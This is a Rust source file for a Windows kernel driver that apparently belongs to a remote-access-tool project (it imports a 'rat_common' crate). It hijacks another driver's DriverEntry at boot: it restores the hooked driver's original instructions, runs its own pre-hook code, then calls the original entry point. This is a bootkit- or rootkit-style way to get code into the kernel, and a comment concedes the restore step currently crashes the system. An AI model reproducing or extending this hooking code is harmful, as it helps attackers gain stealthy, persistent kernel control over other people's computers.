#![no_std]

extern crate alloc;
extern crate wdk_panic;

mod driver;
mod logger;
mod string;

use core::mem;

use log::{LevelFilter, info};
use rat_common::kernel::KernelHandoff;
use wdk_alloc::WdkAllocator;
use wdk_sys::{NTSTATUS, PCUNICODE_STRING, PDRIVER_OBJECT, STATUS_INVALID_PARAMETER};

#[global_allocator]
static GLOBAL_ALLOCATOR: WdkAllocator = WdkAllocator;

type DriverEntryFn =
    unsafe extern "system" fn(driver: PDRIVER_OBJECT, registry_path: PCUNICODE_STRING) -> NTSTATUS;

/// # Safety
/// This function is called by ntoskrnl during `KiSystemStartup`, following Windows x64 calling convention.
#[unsafe(export_name = "DriverEntry")]
pub unsafe extern "system" fn driver_entry(
    driver: PDRIVER_OBJECT,
    registry_path: PCUNICODE_STRING,
    extra: *const KernelHandoff,
) -> NTSTATUS {
    // Log to COM2 port
    com_logger::builder()
        .base(0x2f8)
        .filter(LevelFilter::Trace)
        .setup();

    info!("Running hooked DriverEntry...");

    if extra.is_null() {
        return STATUS_INVALID_PARAMETER;
    }

    let extra = &unsafe { extra.read_unaligned() };

    // Recover original instructions
    // FIXME: This triggered bugcheck ATTEMPTED_WRITE_TO_READONLY_MEMORY. A proposed solution (not implemented yet) is to
    // map the target hooked driver to our own buffer (which has RWX permissions) and call the original DriverEntry there.
    // Not sure if that will work though, our manual PE loader hasn't been verified yet.
    if !extra.original_driver_entry.is_null()
        && !extra.original_instructions.is_null()
        && extra.original_instructions_len > 0
    {
        unsafe {
            extra.original_driver_entry.copy_from_nonoverlapping(
                extra.original_instructions,
                extra.original_instructions_len,
            );
        }
    }

    // Invoke our pre-hook logic
    let _ = driver::driver_entry(
        driver,
        match unsafe { registry_path.as_ref() } {
            Some(s) => unsafe { string::to_utf16str(s) },
            None => None,
        },
    );

    // Call the original DriverEntry
    let status = unsafe {
        let original_fn = mem::transmute::<*mut u8, DriverEntryFn>(extra.original_driver_entry);
        original_fn(driver, registry_path)
    };

    // Invoke our post-hook logic
    info!("Original DriverEntry returned with status: 0x{status:X}");

    status
}
